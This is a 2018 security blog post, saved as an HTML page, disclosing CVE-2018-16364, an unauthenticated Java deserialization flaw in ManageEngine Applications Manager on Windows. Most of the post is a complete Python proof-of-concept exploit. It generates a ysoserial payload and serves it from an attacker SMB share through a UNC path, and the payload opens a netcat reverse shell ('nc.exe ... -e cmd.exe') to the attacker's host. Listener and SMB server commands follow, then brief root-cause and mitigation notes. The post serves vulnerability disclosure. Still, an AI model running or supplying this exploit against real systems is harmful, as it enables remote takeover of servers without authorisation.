<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">
  <meta name="generator" content="Hugo 0.37.1" />

  <title>ManageEngine Applications Manager Deserialization Unauthenticated RCE &middot; Application Security Blog</title>

  
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
  <!--<![endif]-->

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="https://blog.jamesotten.com/css/side-menu-old-ie.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="https://blog.jamesotten.com/css/side-menu.css">
  <!--<![endif]-->

  <link rel="stylesheet" href="https://blog.jamesotten.com/css/blackburn.css">

  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

  
  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

 
  

  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/androidstudio.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/powershell.min.js"></script>
  
  <script>hljs.initHighlightingOnLoad();</script>
  

  <link rel="shortcut icon" href="https://blog.jamesotten.com/img/favicon.ico" type="image/x-icon" />

  
    
        <link rel="stylesheet" href="https://blog.jamesotten.com/css/my.css">
    
  
  

</head>


<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  
  <a class="pure-menu-heading brand" href="https://blog.jamesotten.com/">James Otten</a>


  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="https://blog.jamesotten.com/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="https://blog.jamesotten.com/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="https://blog.jamesotten.com/cves/"><i class='fa fa-bug fa-fw'></i>CVEs</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="https://blog.jamesotten.com/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="mailto:info@jamesotten.com"><i class='fa fa-envelope fa-fw'></i>Contact</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://github.com/james-otten" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
    </li>
    

    

    

    

    

    

    

    

    

    

    

    

    

  </ul>
</div>


  <div>
  <div class="small-print">
    <small>&copy; 2018 James Otten. &nbsp;All rights reserved.</small>
  </div>
  <div class="small-print">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>ManageEngine Applications Manager Deserialization Unauthenticated RCE</h1>
  <h2></h2>
</div>
<div class="content">

  <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>21 Sep 2018</time>
  </div>

  

  

  
  
  
  <div>
    <i class="fa fa-tags fa-fw"></i>
    
      <a class="post-taxonomy-tag" href="https://blog.jamesotten.com/tags/rce">RCE</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="https://blog.jamesotten.com/tags/cve">CVE</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="https://blog.jamesotten.com/tags/manageengine">ManageEngine</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="https://blog.jamesotten.com/tags/deserialization">Deserialization</a>
    
  </div>
  
  

</div>

  <p>This year at Black Hat USA I participated in Offensive Security&rsquo;s <a href="https://www.offensive-security.com/information-security-training/advanced-web-attack-and-exploitation/">AWAE</a>. This training was extremely interesting and I would strongly recommend it to others interested in web application security. One of the modules in AWAE included looking at <a href="https://www.manageengine.com/products/applications_manager/">ManageEngine Applications Manager</a>. As I have some previous experience with web applications and writing PoCs, I occasionally found myself with some spare time during the training. I spent most of this spare time looking deeper into the applications that were included in the training and I ended up finding my first deserialization vulnerability. This vulnerability happens to be an unauthenticated remote root in ManageEngine Applications Manager running on Windows machines. While I have not seen this vulnerability posted online, I know for a fact that I am not the only one who has come across it.
</p>

<h2 id="poc">PoC</h2>

<pre><code class="language-python">#!/usr/bin/python
###############################################################################################################
# Java deserialization vulnerability in Manage Engine Version 13 &lt; 13740 (CustomFieldsFeedServlet) on Windows
# CVE-2018-16364
# Tested on Kali
# In seperate shells:
#     nc -nvlp 4444
#     python /usr/share/doc/python-impacket/examples/smbserver.py awae /root/awae
# James Otten 8/6/2018
###############################################################################################################

import os
import requests
import base64
import socket
import sys

def init_deps(share):
	os.system(&quot;cp /usr/share/windows-binaries/nc.exe %s&quot; % share)
	output_jar = &quot;%s/ysoserial-master.jar&quot; % share
	if not os.path.isfile(output_jar):
		os.system(&quot;wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O %s&quot; % output_jar)

def gen_payload(ip, port, out_file, share):
	cmd = &quot;cmd.exe /c \\\\%s\\%s\\nc.exe %s %s -e cmd.exe&quot; % (ip, share, ip, port)
	os.system(&quot;java -jar ysoserial-master.jar CommonsCollections1 '%s' &gt; %s&quot; % (cmd, out_file))

def print_usage():
	print &quot;Usage:&quot;
	print &quot;\tpython %s &lt;url&gt; &lt;local ip&gt; &lt;reverse shell port&gt; &lt;share name&gt;&quot; % sys.argv[0]
	print &quot;\tpython %s https://manageengine:8443 192.168.124.139 4444 awae&quot; % sys.argv[0]

if len(sys.argv) != 5:
	print_usage()
	exit()

host = sys.argv[1]
smb_host = sys.argv[2]
reverse_shell_port = sys.argv[3]
share = sys.argv[4]
serialized_file = &quot;test.obj&quot;
local_share_location = &quot;/root/%s/&quot; % share

init_deps(local_share_location)
gen_payload(smb_host, reverse_shell_port, local_share_location + serialized_file, share)

path = &quot;/servlet/CustomFieldsFeedServlet?customFieldObject=\\\\%s\\%s\\%s&quot; % (smb_host, share, serialized_file)

req = host + path
res = requests.get(req, verify=False)
if res.status_code == 200:
	print &quot;Incoming reverse shell on %s&quot; % reverse_shell_port
else:
	print &quot;Exploit failed&quot;
	print res.status_code
	print res.text
</code></pre>

<p>Shell 1:</p>

<pre><code>nc -nvlp 4444
</code></pre>

<p>Shell 2:</p>

<pre><code>python /usr/share/doc/python-impacket/examples/smbserver.py awae /root/awae
</code></pre>

<p>Shell 3:</p>

<pre><code>python CustomFieldsFeedServlet.py https://manageengine:8443 192.168.124.139 4444 awae
</code></pre>

<p><code>CustomFieldsFeedServlet</code> was available without authentication and it allowed for users to pass a file path that would be deserialized via <a href="https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#readObject()">readObject()</a>. In order to exploit this, the attacker needs to be able to make their payload accessible to the Applications Manager instance. On platforms other than Windows, the attacker can drop their payload to disk via one of the many SQL injection vulnerabilities in Applications Manager. It is easier to exploit this vulnerability on Windows as the class used to open the passed file path <a href="https://stackoverflow.com/questions/1682194/java-read-file-from-network-device">will resolve and read data from UNC paths</a>, which allows for exploitation without chaining vulnerabilities.</p>

<p>The payload used in this exploit is generated using <a href="https://github.com/frohoff/ysoserial">ysoserial</a>. This payload is served from a public SMB share on the attacker&rsquo;s machine created with the <a href="https://github.com/CoreSecurity/impacket">Impacket</a> <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py">SMB server example</a>.</p>

<p>The exploit can be visualized through the following sequence diagram:
<img src="https://blog.jamesotten.com/img/ME/seq.png" alt="Sequence Diagram" /></p>

<h2 id="analysis">Analysis</h2>

<p>Several things went wrong to cause this vulnerability. First, the lack of authorization on a security sensitive endpoint was addressed previously in CVE-2018-11808. Second, developers need to take extra caution when dealing with the file system, especially when paths are user controlled input. It is very important to know how the classes you are using to interact with the file system will interact with &ldquo;interesting edge cases&rdquo; like symbolic links, hard links, and UNC paths. Finally, unsafe deserialization should be avoided even in cases where input can be trusted because having it in a codebase increases the likelihood that unsafe deserialization will be possible in the future either through copy/pasting or unforeseen requirements changes.</p>

<h2 id="mitigation">Mitigation</h2>

<p>While this vulnerability was remediated in Applications Manager 13740, I recommend discontinuing use of this software and rebuilding systems where ManageEngine/Zoho products are installed or systems where a ManageEngine/Zoho product had privileged access to.</p>

<h2 id="more-information">More information</h2>

<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16364">CVE-2018-16364</a></li>
</ul>

  
<div class="prev-next-post pure-g">
  <div class="pure-u-1-24" style="text-align: left;">
    
    <a href="https://blog.jamesotten.com/post/buildmaster-xslt-rce/"><i class="fa fa-chevron-left"></i></a>
    
  </div>
  <div class="pure-u-10-24">
    
    <nav class="prev">
      <a href="https://blog.jamesotten.com/post/buildmaster-xslt-rce/">BuildMaster Configuration File Template XSLT RCE</a>
    </nav>
    
  </div>
  <div class="pure-u-2-24">
    &nbsp;
  </div>
  <div class="pure-u-10-24">
    
  </div>
  <div class="pure-u-1-24" style="text-align: right;">
    
  </div>
</div>



  
<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    if (window.location.hostname == "localhost")
        return;

    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    var disqus_shortname = 'jamesotten';
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


</div>

</div>
</div>
<script src="https://blog.jamesotten.com/js/ui.js"></script>


<script>
  
  if (window.location.hostname != "localhost") {
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-119250474-1', 'auto');
    ga('send', 'pageview');
  }
</script>





</body>
</html>

